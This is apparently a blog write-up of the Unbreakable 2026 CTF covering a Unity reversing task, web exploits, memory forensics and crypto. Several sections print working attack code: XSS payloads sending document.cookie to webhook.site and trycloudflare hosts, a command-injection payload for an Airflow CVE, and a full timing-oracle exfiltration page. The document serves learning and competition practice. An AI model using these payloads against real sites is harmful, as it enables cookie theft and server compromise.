+++
date = '2026-03-09'
draft = false
title = 'Unbreakable 2026'
ShowToc = true
tags = ["ctf"]
+++

## Overview

Although my team didn't qualify for the finals this edition of Unbreakable, we still placed a decent score and since I enjoy making writeups I decided I'd make one anyways. Just as a heads-up, I will only include the ones that I personally solved.

![challenge-screenshot](scores.png#center)

Since we were only two members, it was a little tough on us, and I stayed up the entire last night, but it didn't really make up for the lack of manpower. And this really felt more like a project management competiton; who can get their three agents to do the fastest, efficient and most work.

I felt like almost *none* of these challenges were manageable without AI, but I do understand that making them palpable meant they could be solved in two prompts. Nevertheless, there were still some challenges that I enjoyed solving. 

Now, let's actually get into the challenges!

## the flag is a lie 

![challenge-screenshot](top9.png#center)

This was the first challenge I solved. Took me quite a while but I was proud of it. 

We were provided with a small Unity game. And what immediately struck me as strange was that they also included a *linux* build for it. We get the sources and a `TheFlagIsALie_Data` folder, inluding the resourced the game was using, and an `il2cpp_data` folder. 

If I thought about that earlier I wouldn't have spent so much time on it; About all of game hacking is done on Windows, and the fact that we had a linux game meant this was *NOT* a game hacking challenge. I was very disappointed to find this out, because game hacking is why I got into cybersecurity in the first place. So I thought this was a pretty lame challenge. 

If you don't know `il2cpp` that means, is that reversing will get slightly more difficult. The game goes from `C#` to `IL` (intermediate language) which is executed by Mono. What Unity can do, is use `il2cpp` to turn that `IL` into very optimized `C++` before compiling. 

This was a first person game with two levels, the first one was pushing a box onto a pressure plate and the second was jumping on a moving plate to reach a flag mesh. Obviously that wasn't the real flag, and trying to jump to it from the plate would just throw you into the water underneath and crash the game. 

The first thing I did was go onto my Windows laptop, open Cheat Engine, `nop` the `ExitGameOnTrigger` function and explore the map. I didn't find anything useful, so I found our player's jump velocity and freezed it at a 3 to fly around the map, but there was still nothing. 

![challenge-screenshot](walky.png#center)

So if this wasn't the way to solve it, what was? I used AssetRipper next to extract all of the data, and found another secret level called *DevLevel_DontShip.unity*. This seemed interesting, so I exported the project and installed Unity to try and open it. I looked at *level1*, but it was almost completely empty except for some `LogRecorder` object. It also had a very obfuscated code attached to it:

- `_o7677514b43(byte[] plaintext, byte[] key, out byte[] iv)`, which was an encryption function;

- `_oc1e208cb7a`, with 16 int fields, that calls `_o36e07a77cc`;

- `_o36e07a77cc(out byte[] key)`, which produced a byte array key, taking each int from the array given by the previous function and turning it to a byte value, eventually creating the final key.

(There were more functions but these were the most important).

I started investigating it and found it also existed in the level0 scene, the one we were allowed to play.

There was also a *Logs* folder I didn't pay much attention to at first, but now seemed relevant, containing an encoded `session-20260225-111621.unrl`. And `.unrl` is not a real extension, which I missed, oops.

So this challenge now looks like reversing the cryptography functions and decrypting the logs. The way to solve this was to look through all the resources for the `_oc1e208cb7a` string, which was found by Claude as `26c1c156a22d3174e5ebf7c1c8b94b6e`. It was laying in the level1 file, right after the function name. Since the LogRecorder script, `_o1b42fd6de7`, was a `[SerialReference]` private object, it was just being saved as part of the scene, kind of like config data. It was computed once when the scene was generated and then just left to lay there. 

![challenge-screenshot](key.png#center)

Then, after we decrypt the logs, they become csv data, with a bunch of entries with these fields: `entity_id	create_x, create_y, create_z, last_x, last_y, last_z, create_time, delete_time, lifetime`. Now all we need to do is visualize this data. This took me a while, I tried using some online tools but nothing readable emerged, so I tried using ChatGPT and after about an hour I managed to extract the mirrored flag, by taking the final position of each entity, selecting the thin plane where all the letters exist `(610.7 < x < 611.15)` and taking the `y` and `z` and projecting them onto a 2d plane.

The tools for *actually* doing this, are `pandas`, `numpy` and `matplotlib`, something like this:

```python
plane = last[
    (last["x"] > 610.7) &
    (last["x"] < 611.15)
]
plt.scatter(plane["z"], plane["y"])
```

I was still disappointed this was just another cryptography challenge, but it was alright.

![challenge-screenshot](flag_mirror.png#center)

`UNR{certified_crate_pusher}`

## demolition

This was definitely one of the easier ones.

We were provided with two websites, one some kind of html page renderer, where we could add a profile blob (`p=`) and a draft html (`d=`), and then an admin bot with the cookie as a flag. So just XSS.

There were two render engines in the source codes, a *python* one set by default and a *go* one, running a broken sanitizer. By setting our profile blob to `p=render.engine=go` we could reach the branch we can abuse. There was a python pre-filter which blocked just the ASCII `<script`, and then the Go sanitizer was doing *unicode case folding*. The line `strings.EqualFold(..)` means it was treating Unicode characters as equivalent ASCII doing comparison. So it would transform the weird unicode into ascii before rendering. 

You can guess where this is going - using `<ſcript>` was the whole bypass. So our payload looked like `<ſcript>location='https://webhook.site/960999bb-173d-4605-878c-b8afa5b55613/?c='+encodeURIComponent(document.cookie)</ſcript>`; except I had to url-encode the entire `d` parameter for it to work, so `https://demolition.breakable.live/?p=render.engine%3Dgo&d=%3C%C5%BFcript%3Ewindow.location.href%3D%60https%3A%2F%2Fwebhook.site%2F960999bb-173d-4605-878c-b8afa5b55613%2F%3Fc%3D%24%7BencodeURIComponent(document.cookie)%7D%60%3C%2F%C5%BFcript%3E`.

Then, we just send that link to the bot, and get back the flag: `CTF{7b5d3e42e57dab38821b5215138825098cbe965c67c131b6c64be1805626481d}`. 

![challenge-screenshot](flig.png#center)

## nday-1

I actually liked this one. We're given an Apache Airflow website, without any source code, and admin credentials. This usually means we have to identify the most likely outdated framework and find a CVE that matches it.

This was a DAG (Directed Acyclic Graph) website, which means the blueprint of your workflow. We can quickly identify this as *Apache airflow 3.0.4*, and I just searched for known CVEs that affect this version. After a while I found this one, [CVE-2025-54941](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-52213/version_id-2024493/year-2025/opec-1/Apache-Airflow-3.0.4.html). This matched our website to a T, since it was a vulnerability in one of the default DAGs, `example_dag_decorator`, which could allow us to run commands on the server and view their logs on the website, since we were admin. 

A word about this CVE, basically this DAG was running this code: 

```python
external_ip = raw_json["origin"]

return {
 "command": f"echo 'Seems like today your server executing Airflow is connected from IP {external_ip}'"
}
```

So just basic command injection, where it was taking the raw json from the remote API (or so it thought!) and returning the output inside an echo command.

I hosted a cloudflared website with this script running:
```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        payload = {"origin": "'; cat /flag.txt ; echo '"}
        body = json.dumps(payload).encode()

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

HTTPServer(("0.0.0.0", 8000), H).serve_forever()
```

Now, we just need the server to execute the DAG with our malicious cloudflared tunnel. We just connect to the website as admin, fetch the cookie, and trigger the DAG like so:

```bash
NOW=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

curl -s -X POST "$BASE/api/v2/dags/example_dag_decorator/dagRuns" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"logical_date\":\"$NOW\",
    \"conf\":{
      \"url\":\"https://server.trycloudflare.com\"
    }
  }"
```

And pretty quickly we get the flag, in the `echo_ip_info` logs: 

![challenge-screenshot](flegj.png#center)

`CTF{2539590147b12b33dfd9d0bc65c86aec525af4d4dd9c997258d57b09c9adf16d}`

## minegamble

This was probably my favorite challenge! It was very creative and funny.

The first part was pretty easy, we essentially needed the *Owner* role to get access to an Admin Support Ticket tab. And we just needed a lot of money. The actions we could do were buy an item, and then sell it with a 10% tax. There was also a *gamble* section but it didn't look too interesting to me.

I pretty quickly figured out it was a race condition attack, so we can just send a bunch of *sell* requests at the same time and they would all get validated and give us money. I can proudly say I only used my brain for this.

![challenge-screenshot](timing.png#center)

Now the next part was a little trickier! We have access to the Admin Support Ticket, and we *can* execute XSS in the ticket's body (not subject) because something isn't being sanitized properly; and there was also an interesting script included in the view ticket page's html, *telemetry.js*. What it did was kind of:

```js
function flushCrashLogs() {
    const logSink = window.crashReportSink || '/api/diagnostics/log';

    const state = {
        cookie,
        and a bunch of stuff that doesn't matter
    };

    window.location.replace(logSink + "?ctx=" + btoa(JSON.stringify(state)));
}
```

So we needed to make a XSS payload that would somehow overwrite this `window.crashReportSink` to our own malicious free cloudflared tunnel.

At first I tried something like

```js
"body": "<img src=x onerror=window.crashReportSink='https://webhook.site/8e94c29e-a5e1-4d95-a6d9-7380ef2bb3c7';flushCrashLogs()>" 
```

But it didn't work because of the CSP which blocked inline JS. So we needed to find another way to make the website think that `window.crashReportSink` was our website, and somehow trigger the script with some sort of error. 

The ticket payload I ended up with was this: 

```js
{"subject":"c","body":"<a id=\"crashReportSink\" name=\"crashReportSink\" href=\"https://indicated-caution-irrigation-sail.trycloudflare.com\"></a>\n<div _=\"on load call window.flushCrashLogs()\"></div>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.14/_hyperscript.min.js\"></script>"}
```

This was very clever; To avoid getting blocked by the inline JS thing, it called an actual cloudflared library called *hyperscript* which allows us to but behaviour directly in an element's `_` attribute, which just so happens to have a `load` event. So we set our `<a>`'s id and name to overwrite the `window.crashReportSink`, then trigger the function, and we get the flag!

![challenge-screenshot](gobl.png#center)
 
`CTF{232d8f9f99d0a3e440297b4aee4774c2d2e75868c6ec85d585f8410404e56cd1}`

## svfgp

This one had a pretty similar look to the other challenge, demolition, with the same format, except instead of a html draft we had some notes that we can create. 

This one took me *so* long and *so so so* many requests that after I used up about five webhook free trial accounts, I was forced to host my own with cloudflared.

Alright, so we can create notes. We have the source code, and it looks like there can also be *sealed* local notes. And the flag is written into the bot's localStorage, from the sealed note.

There is a weird `mode=probe` thing though, that kind of looks like this:

```js
const candidate = q;
const secret = loadSecret();

if (secret && candidate && secret.startsWith(candidate)) {
  await deriveHash(secret);
}

window.opener.postMessage({ type: "svfgp-probe-done", sid, rid }, "*");
```

So if the bot tried to reach `/?mode=probe&q=CTF{a` it would start trying to run that expensive hash function, which would take a whole lot longer to run. And even though the bot would be on our website, we could still get it to open our pop-ups to the svfgp website and try to access the page, and then send back a message to us with the time of each request.

This type of bus is called an XS-leak or timing oracle.

I tried doing this the fast way, (as fast as leaking character by character can be), but it kept getting false positives, so I had it run three tests for each character and have me manually confirm after every single one. Here is the script (ChatGPT):

```js
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>svfgp stable next-char probe</title>
</head>
<body>
<pre id="log">boot</pre>
<script>
const TARGET = 'https://svfgp.breakable.live/';
const WEBHOOK = 'https://shell-changes-anthony-answered.trycloudflare.com';

// Put only the part you trust here.
const KNOWN = 'CTF{1390e7327d4c2069a97e3a7f1eafed37e389f9fb9598b183455dc9f6cc2da658';

// Assumption: CTF{ + 64 lowercase hex + }
const OPENING = 'CTF{';
const HASH_LEN = 64;
const HEX = '0123456789abcdef';

// Reliability knobs
const REPS = 3;                  // 3 is a good start
const GAP_BETWEEN_PROBES = 120;  // ms
const SINGLE_TIMEOUT = 12000;    // ms

const logEl = document.getElementById('log');
function log(s) {
  console.log(s);
  logEl.textContent += '\n' + s;
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function exfilQS(params) {
  const usp = new URLSearchParams(params);
  const url = WEBHOOK + '?' + usp.toString();
  try {
    fetch(url, {
      method: 'GET',
      mode: 'no-cors',
      cache: 'no-store',
      credentials: 'omit'
    }).catch(() => {});
  } catch (_) {}
}

function exfilJSON(obj) {
  try {
    navigator.sendBeacon(
      WEBHOOK,
      new Blob([JSON.stringify(obj)], { type: 'text/plain' })
    );
  } catch (_) {}
}

function median(arr) {
  const s = [...arr].sort((a, b) => a - b);
  const n = s.length;
  if (n === 0) return NaN;
  if (n % 2) return s[(n - 1) / 2];
  return (s[n / 2 - 1] + s[n / 2]) / 2;
}

function nextAlphabet(prefix) {
  const recoveredHex = prefix.length - OPENING.length;
  if (recoveredHex < HASH_LEN) return HEX.split('');
  if (recoveredHex === HASH_LEN) return ['}'];
  return [];
}

function randId() {
  return Math.random().toString(36).slice(2) + Date.now().toString(36);
}

async function singleProbe(candidatePrefix, candidateChar, repIndex) {
  return new Promise((resolve, reject) => {
    const sid = randId();
    const rid = `${candidateChar}:${repIndex}:${sid}`;
    const url = new URL(TARGET);
    url.searchParams.set('mode', 'probe');
    url.searchParams.set('q', candidatePrefix);
    url.searchParams.set('sid', sid);
    url.searchParams.set('rid', rid);

    let w = null;
    let done = false;
    const start = performance.now();

    function cleanup() {
      window.removeEventListener('message', onMessage);
      try { if (w && !w.closed) w.close(); } catch (_) {}
    }

    function finishOk(dt) {
      if (done) return;
      done = true;
      cleanup();
      resolve(dt);
    }

    function finishErr(msg) {
      if (done) return;
      done = true;
      cleanup();
      reject(new Error(msg));
    }

    function onMessage(e) {
      if (e.origin !== 'https://svfgp.breakable.live') return;
      const d = e.data;
      if (!d || d.type !== 'svfgp-probe-done') return;
      if (d.sid !== sid) return;
      if (d.rid !== rid) return;
      finishOk(performance.now() - start);
    }

    window.addEventListener('message', onMessage);

    try {
      w = window.open(url.toString(), '_blank', 'popup,width=220,height=220');
      if (!w) {
        finishErr('popup blocked');
        return;
      }
    } catch (e) {
      finishErr('window.open failed');
      return;
    }

    setTimeout(() => finishErr('probe timeout'), SINGLE_TIMEOUT);
  });
}

async function measureCandidate(prefix, ch, reps) {
  const full = prefix + ch;
  const samples = [];

  for (let i = 0; i < reps; i++) {
    try {
      const dt = await singleProbe(full, ch, i);
      samples.push(dt);
      log(`${ch} rep${i} => ${dt.toFixed(1)}ms`);
      await sleep(GAP_BETWEEN_PROBES);
    } catch (e) {
      log(`${ch} rep${i} ERROR ${e.message}`);
      samples.push(SINGLE_TIMEOUT);
      await sleep(GAP_BETWEEN_PROBES);
    }
  }

  return {
    ch,
    samples,
    med: median(samples)
  };
}

async function main() {
  const alphabet = nextAlphabet(KNOWN);
  if (alphabet.length === 0) {
    exfilQS({ flag: KNOWN, extra: 'nothing-to-do', t: Date.now() });
    return;
  }

  exfilQS({ flag: KNOWN, extra: 'start', t: Date.now() });
  log('known=' + KNOWN);
  log('alphabet=' + alphabet.join(''));

  const results = [];

  // Round-robin would be okay, but fully sequential is simplest and most stable.
  for (const ch of alphabet) {
    const r = await measureCandidate(KNOWN, ch, REPS);
    results.push(r);

    exfilQS({
      flag: KNOWN,
      extra: `cand:${ch}:med:${r.med.toFixed(1)}:samples:${r.samples.map(x => x.toFixed(1)).join(',')}`,
      t: Date.now()
    });
  }

  results.sort((a, b) => b.med - a.med);

  const best = results[0];
  const second = results[1] || null;
  const margin = second ? best.med - second.med : best.med;

  const summary = {
    known: KNOWN,
    best: best.ch,
    bestMedian: best.med,
    second: second ? second.ch : null,
    secondMedian: second ? second.med : null,
    margin,
    results
  };

  log('best=' + best.ch + ' med=' + best.med.toFixed(1));
  if (second) {
    log('second=' + second.ch + ' med=' + second.med.toFixed(1));
    log('margin=' + margin.toFixed(1));
  }

  // Query-string summary
  exfilQS({
    flag: KNOWN + best.ch,
    extra: `winner:${best.ch}:margin:${margin.toFixed(1)}`,
    t: Date.now()
  });

  // Full raw data
  exfilJSON(summary);
}

window.addEventListener('load', () => {
  main().catch(err => {
    log('ERROR ' + err.message);
    exfilQS({
      flag: KNOWN,
      extra: 'error:' + err.message,
      t: Date.now()
    });
    exfilJSON({ known: KNOWN, error: err.message });
  });
});
</script>
</body>
</html>
```

And the flag was `CTF{1390e7327d4c2069a97e3a7f1eafed37e389f9fb9598b183455dc9f6cc2da658}`. Took me about two hours to exfil the whole thing.


## RAM Vault Beacon Malware

This was a linux malware memory forensics. Basically after the malware ran, it generated some parameters, derived a cryptographic key based on them and encrypted a *vault* in the memory. So we needed to decrypt this RAM blob inside the ram.

I had to install this specific linux image for volatility to run it, so there was a bunch of broken installation on kali that came with this challenge which was pretty annoying. 

I dumped the pslist with `python3 vol.py -f ../virus/memory.lime linux.pslist` and found the fishy python one to sniff around, with the PID 27316, and the `/opt/ctf_vault/ram_vault_beacon`. This used the `/etc/machine-id` file which I tried to recover with `python3 vol.py -f ../virus/memory.lime -o recovered linux.pagecache.RecoverFs` but everything important just seemed empty.

The only thing we still had was the `ram_vault_beacon` binary, which handled all the encryption. Then, using `inux.vmaregexscan.VmaRegExScan --pid 27316` we recovered the following:

- `TASK_ID=1bcec366-9649-4a61-8c2d-9c6b2c2a702a`

- `KDF_SALT=d17025e353b5380823b9eef194ef33ad`

- `STAGE_ARGS_B64=TRVnDl1dSQDmaFZohHQdYe0nqpAS+w9qgphZ9rBC7gARGbEalpjyTCw+o/KopwZzIg4OQ8W/3m7tuiOy7/74AgA=`

Then, the machine-id was recoverable from the cache in the memory dump. Running `python3 vol.py -f ../virus/memory.lime linux.pagecache.Files 2>/dev/null | grep -i "machine-id"` showed us that it had the inode `0x89aa0b142f68` with a 33 byte size. Then, to get its page address, I ran `python3 vol.py -f ../virus/memory.lime linux.pagecache.InodePages --inode 0x89aa0b142f68` and got `0x10ac4e000`.

Then, to finally get the machine-id, I ran this script:

```bash
python3 - << 'FUFU'
import struct

path = "/home/kali/Downloads/virus/memory.lime"
LIME_MAGIC = 0x4C694D45
HDR_SIZE = 32
target_phys = 0x10ac4e000

with open(path, "rb") as f:
    while True:
        hdr = f.read(HDR_SIZE)
        if len(hdr) < HDR_SIZE:
            break
        magic, ver, start, end = struct.unpack_from("<IIQQ", hdr)
        if magic != LIME_MAGIC:
            break
        size = end - start + 1
        data_offset = f.tell()
        if start <= target_phys <= end:
            off_in_range = target_phys - start
            f.seek(data_offset + off_in_range)
            data = f.read(64)
            print(f"Found in range 0x{start:x}-0x{end:x}")
            print(f"Raw bytes: {data[:33]}")
            print(f"As string: {data[:33].decode(errors='replace').strip()}")
            break
        f.seek(size, 1)
FUFU
```

Which just fetched the 33 bytes that were at that page address, and got us the machine-id as `783abf8dcd8846d889fee75ae6b1046a`.

We also needed the `ts_window`. The malware ran for about 10 minutes, so we took the possible timestamps in little-endian and only found `1772107800` (which was 2026-02-26 12:10:00 UTC).

The vault could be identified by its header, `03 00 00 00 18 00 00 00 20 00 00 00 30 00 00 00`. These values represented version (3), nonce_len (24), pt_len (32, plaintext length) and ct_len (48).

So the malware, on execution, created the `TASK_ID`, `KDF_SALT` and `STATE_ARGS_B64`. Then, it read the machine-id and derived a key based on all of these and the time stamp. Using these, it created the vault, with the XChaCha20-Poly1305 algorithm. 

So *FINALLY* we have all the pieces we need, we can run this script and finish this challenge once and for all:

```python
#!/usr/bin/env python3
import base64
import ctypes
import hashlib
import struct

# Live values from PID 27316
machine_id = b"783abf8dcd8846d889fee75ae6b1046a"
task_id = b"1bcec366-9649-4a61-8c2d-9c6b2c2a702a"
kdf_salt_ascii = b"d17025e353b5380823b9eef194ef33ad"
kdf_salt_raw = bytes.fromhex(kdf_salt_ascii.decode())
stage_b64 = b"TRVnDl1dSQDmaFZohHQdYe0nqpAS+w9qgphZ9rBC7gARGbEalpjyTCw+o/KopwZzIg4OQ8W/3m7tuiOy7/74AgA="
stage_raw = base64.b64decode(stage_b64)
ts_window = 1772107800

blob = bytes.fromhex(
    "0300000018000000200000003000000065a0ba42"
    "31030b3e2b7319e203f7b08bc5ef18373acaf006e7c8e6f7"
    "d2b5f03f0ef3b753095f21cc1924e1c8c21072aff814b697"
    "3d980614b0ea1074f269b3c9b17ecc48dd3c054b2932f839"
)

nonce = blob[20:44]
ct = blob[44:92]

lib = ctypes.cdll.LoadLibrary("libsodium.so.23")
lib.sodium_init()

decrypt_fn = lib.crypto_aead_xchacha20poly1305_ietf_decrypt
decrypt_fn.argtypes = [
    ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulonglong), ctypes.c_void_p,
    ctypes.c_void_p, ctypes.c_ulonglong,
    ctypes.c_void_p, ctypes.c_ulonglong,
    ctypes.c_void_p, ctypes.c_void_p
]
decrypt_fn.restype = ctypes.c_int

def dec(key: bytes, aad: bytes):
    out = ctypes.create_string_buffer(128)
    out_len = ctypes.c_ulonglong(0)
    rc = decrypt_fn(
        out, ctypes.byref(out_len), None,
        ctypes.create_string_buffer(ct, len(ct)), len(ct),
        ctypes.create_string_buffer(aad, len(aad)), len(aad),
        ctypes.create_string_buffer(nonce, len(nonce)),
        ctypes.create_string_buffer(key, len(key)),
    )
    if rc == 0:
        return out.raw[:out_len.value]
    return None

ts_le = struct.pack("<Q", ts_window)

# plausible variants from reversing
stage_hash_b64 = hashlib.sha256(stage_b64).digest()
stage_hash_raw = hashlib.sha256(stage_raw).digest()
salt_hash_ascii = hashlib.sha256(kdf_salt_ascii).digest()

aad_variants = {
    "aad_mid_task": hashlib.sha256(machine_id + task_id).digest(),
    "aad_task_mid": hashlib.sha256(task_id + machine_id).digest(),
    "aad_mid": hashlib.sha256(machine_id).digest(),
    "aad_task": hashlib.sha256(task_id).digest(),
    "aad_none": b"",
}

key_variants = {
    "k1": hashlib.sha256(kdf_salt_raw + hashlib.sha256(machine_id + task_id + ts_le + stage_hash_b64).digest() + b"rocsc/vault").digest(),
    "k2": hashlib.sha256(kdf_salt_raw + hashlib.sha256(machine_id + task_id + ts_le + stage_hash_raw).digest() + b"rocsc/vault").digest(),
    "k3": hashlib.sha256(kdf_salt_raw + hashlib.sha256(task_id + machine_id + ts_le + stage_hash_b64).digest() + b"rocsc/vault").digest(),
    "k4": hashlib.sha256(kdf_salt_raw + hashlib.sha256(machine_id + ts_le + task_id + stage_hash_b64).digest() + b"rocsc/vault").digest(),
    "k5": hashlib.sha256(salt_hash_ascii + hashlib.sha256(machine_id + task_id + ts_le + stage_hash_b64).digest() + b"rocsc/vault").digest(),
    "k6": hashlib.sha256(hashlib.sha256(machine_id + task_id + ts_le + stage_hash_b64).digest() + kdf_salt_raw + b"rocsc/vault").digest(),
}

for kname, key in key_variants.items():
    for aname, aad in aad_variants.items():
        pt = dec(key, aad)
        if pt is not None:
            print("[+] HIT")
            print("key variant:", kname)
            print("aad variant:", aname)
            print("plaintext bytes:", pt)
            print("plaintext hex  :", pt.hex())
            try:
                print("plaintext ascii:", pt.decode())
            except Exception:
                pass
            print("flag: CTF{" + pt.hex() + "}")
            raise SystemExit

print("[-] no hit")
```

![challenge-screenshot](ram.png#center)

`CTF{55eb337497c226fadcd74648227da4831106f06439145d500bb383b47bfa8745}`

## Relay in the Noise

I struggled with this challenge for quite a while, and my teammate was the one who solved it, but I'm going to include this because it was pretty interesting. There were a bunch of UDP packets, each stream containing a `noise:i:hash` value, then the 120th one with some amateur radio communication. 

What worked was extracting the `BLT/NN/17` base32 strings, concatenating all of them and decoding them. So now we have a chipertext that is 128 bytes long. 

We also had a hint, `sha(lower(grid)|ssid)`, where we were given a `fn31pr` grid and a ssid of 9. Since sha256 only produced 32 bytes, that meant we needed a key that was 5 times longer. 

So the way to do it was to concatenate the hash with a counter, like so: `sha256(b"fn31pr|9" + b"\x00\x00\x00\x00")` + `sha256(b"fn31pr|9" + b"\x00\x00\x00\x01")` + `sha256(b"fn31pr|9" + b"\x00\x00\x00\x02")`... Until the key's length got to the ciphertext's length, then just xor them.

What worked was this script:

```python
import struct
import base64
import hashlib
import zlib

parts = {
    1:  "IDQ4TVGWTBWZ",
    2:  "KAO4XDIUCOBH",
    3:  "5N5TTSJ2AU5B",
    4:  "3VJH62ZYAAKA",
    5:  "Y3ZIXF64WXEP",
    6:  "7ROLYTNENRCS",
    7:  "2BBQRJXFOABS",
    8:  "FT7NWEANE6EA",
    9:  "RKRMBFJ3CLDN",
    10: "UGELST6IVAEZ",
    11: "OLTCN4GR56ZE",
    12: "7N4QBIQBD6JX",
    13: "SXGURNDWX5E2",
    14: "ZUXTQ3MIKM3O",
    15: "2DJLMZJSZQDH",
    16: "KH7KU5MJYNTU",
    17: "CO7CGNQ6ZUYQ",
}

b32 = ''.join(parts[i] for i in range(1, 18))
b32 += '=' * ((8 - len(b32) % 8) % 8)
cipher = base64.b32decode(b32)

seed = b"fn31pr|9"

ks = b""
counter = 0
while len(ks) < len(cipher):
    ks += hashlib.sha256(seed + struct.pack(">I", counter)).digest()
    counter += 1

plain = bytes(c ^ k for c, k in zip(cipher, ks[:len(cipher)]))
msg = zlib.decompress(plain).decode()

print(msg)
```

Which gave us the flag, `UNR{4x25_p47h5_4nd_6r1d_5qu4r35_73ll_7h3_570ry_2fee56dc8f22f6a7}`.

## toxicwaste

Since it was cryptography, everyone just used ChatGPT and got a working script in three prompts. What was weird at first is I thought the server wasn't responding, but it was just that it was taking a while to compute the huge values for p. I doubt there's any chance I'd understand this script so I won't bother trying to. But here it is:

```py
#!/usr/bin/env sage -python
from sage.all import *
from pwn import *
import ast

HOST = "35.234.72.251"
PORT = 30847

context.log_level = "info"

io = remote(HOST, PORT)
io.timeout = 300


def recv_until_token(token: bytes) -> bytes:
    data = b""
    while token not in data:
        chunk = io.recv(4096, timeout=300)
        if not chunk:
            raise EOFError(f"Connection closed while waiting for {token!r}")
        data += chunk
    return data


def recv_line_after_prefix(prefix: bytes) -> bytes:
    data = recv_until_token(prefix)
    idx = data.index(prefix) + len(prefix)
    rest = data[idx:]

    while b"\n" not in rest:
        chunk = io.recv(4096, timeout=300)
        if not chunk:
            raise EOFError("Connection closed while waiting for line end")
        rest += chunk

    line, leftover = rest.split(b"\n", 1)
    if leftover:
        io.unrecv(leftover)
    return line


def recv_pub_expr():
    """
    Read the huge `pub = [...]` object safely, preserving any trailing bytes
    such as '\r\nC = ' by pushing them back with io.unrecv().
    """
    data = recv_until_token(b"pub = [")
    idx = data.index(b"pub = [") + len(b"pub = ")
    expr = data[idx:]  # starts with '['

    depth = expr.count(b"[") - expr.count(b"]")
    while depth > 0:
        chunk = io.recv(4096, timeout=300)
        if not chunk:
            raise EOFError("Connection closed while reading pub")
        expr += chunk
        depth += chunk.count(b"[") - chunk.count(b"]")

    end = expr.find(b"]")
    while end != -1:
        candidate = expr[: end + 1]
        try:
            val = ast.literal_eval(candidate.decode())
            leftover = expr[end + 1 :]
            if leftover:
                io.unrecv(leftover)
            return val
        except Exception:
            end = expr.find(b"]", end + 1)

    raise ValueError("Could not parse pub list")


def recv_next_z():
    """
    Server prints `z = ...\\n` and then waits with `input("y = ")`.
    The `y = ` prompt has no newline, so we only need to wait for the z-line.
    """
    while True:
        line = io.recvline(timeout=300)
        if not line:
            raise EOFError("Connection closed while waiting for z")
        s = line.decode(errors="ignore").strip()
        if s.startswith("z = "):
            return Integer(s.split("=", 1)[1].strip())


# ----------------------------
# Read p and pub
# ----------------------------
p_line = recv_line_after_prefix(b"p = ")
p = Integer(p_line.decode().strip())
log.info(f"p received ({len(str(p))} digits)")

pub_raw = recv_pub_expr()
log.info(f"pub received ({len(pub_raw)} points)")

# Optional visibility into already-buffered bytes
try:
    extra = io.recv(timeout=1)
    if extra:
        log.info(f"extra bytes after pub: {extra!r}")
        io.unrecv(extra)
except EOFError:
    pass

# ----------------------------
# Rebuild curve exactly like the server
# ----------------------------
E = EllipticCurve(GF(p), [0, 1])

# This is the real deterministic G1 used by the challenge
true_G1_E = E.gens()[0] * 6
o = true_G1_E.order()

Fp2 = GF(p**2, "w", modulus=[1, 1, 1])  # w^2 + w + 1 = 0
w = Fp2.gen()
E2 = EllipticCurve(Fp2, [0, 1])

true_G1 = E2(true_G1_E)

pub_pts = []
pub_coeffs = []
for (xy, c) in pub_raw:
    x, y = xy
    P = E((Integer(x), Integer(y)))
    pub_pts.append(P)
    pub_coeffs.append(Integer(c) % o)

n = len(pub_pts)
assert n == 40

# ----------------------------
# Send C immediately to avoid timeout
# Use the real G1, so commitment scalar is c = 1.
# ----------------------------
recv_until_token(b"C = ")
log.info("Got C prompt")
io.sendline(f"{Integer(true_G1_E[0])},{Integer(true_G1_E[1])}".encode())
log.info("Sent early commitment C = G1")

# ----------------------------
# Distortion map for supersingular curve y^2 = x^3 + 1
# psi(x,y) = (w*x, y)
# ----------------------------
def psi(P):
    return E2((w * Fp2(P[0]), Fp2(P[1])))

# ----------------------------
# Locate the true G1 inside the scrambled pub list
# ----------------------------
try:
    g1_index = next(i for i, P in enumerate(pub_pts) if P == true_G1_E)
except StopIteration:
    raise ValueError("Could not find the actual G1 in the public setup")

log.info(f"Found true G1 at scrambled index {g1_index}")

# ----------------------------
# Build full pairing matrix and global frequency table
# M[i][j] = e(pub[i], psi(pub[j]))
# Equal values lie on anti-diagonals in the correct order.
# ----------------------------
pairvals = [[None] * n for _ in range(n)]

for i in range(n):
    Pi = E2(pub_pts[i])
    for j in range(n):
        pairvals[i][j] = Pi.weil_pairing(psi(pub_pts[j]), o)

global_counts = {}
for i in range(n):
    for j in range(n):
        v = pairvals[i][j]
        global_counts[v] = global_counts.get(v, 0) + 1

# In the row corresponding to true G1 = alpha^0 G1, the anti-diagonal sizes are:
# 1,2,3,...,40
order_idx = sorted(range(n), key=lambda j: global_counts[pairvals[g1_index][j]])
ordered_pts = [pub_pts[j] for j in order_idx]
ordered_coeffs = [pub_coeffs[j] for j in order_idx]

if ordered_pts[0] != true_G1_E:
    raise ValueError("Recovered order does not start with true G1")

row_sizes = [global_counts[pairvals[g1_index][j]] for j in order_idx]
log.info(f"Recovered order row sizes = {row_sizes}")

# ----------------------------
# Recover alpha from the setup polynomial
# Sum c_i * alpha^i = 0 mod o
# ----------------------------
R = PolynomialRing(GF(o), "x")
x = R.gen()
Ppol = sum(GF(o)(ordered_coeffs[i]) * x**i for i in range(n))

roots = [Integer(r) for (r, _) in Ppol.roots()]
alpha = None

for r in roots:
    ok = True
    for i in range(n - 1):
        if r * ordered_pts[i] != ordered_pts[i + 1]:
            ok = False
            break
    if ok:
        alpha = r
        break

if alpha is None:
    raise ValueError("Could not recover alpha")

log.info("Recovered alpha")

# Commitment was C = G1, so c_scalar = 1
c_scalar = Integer(1)

# ----------------------------
# Answer 100 openings
# Choose degree-41 polynomial y = z^41 mod o.
# Witness scalar:
#   w = (c - y) / (alpha - z) mod o
# and pi = w * G1
# This satisfies:
#   e(pi, G2alpha - z G2) = e(C - y G1, G2)
# ----------------------------
for rnd in range(100):
    z_full = recv_next_z()
    z = z_full % o

    y = power_mod(z, 41, o)

    # Avoid edge cases where denominator or witness would be zero
    if z == alpha:
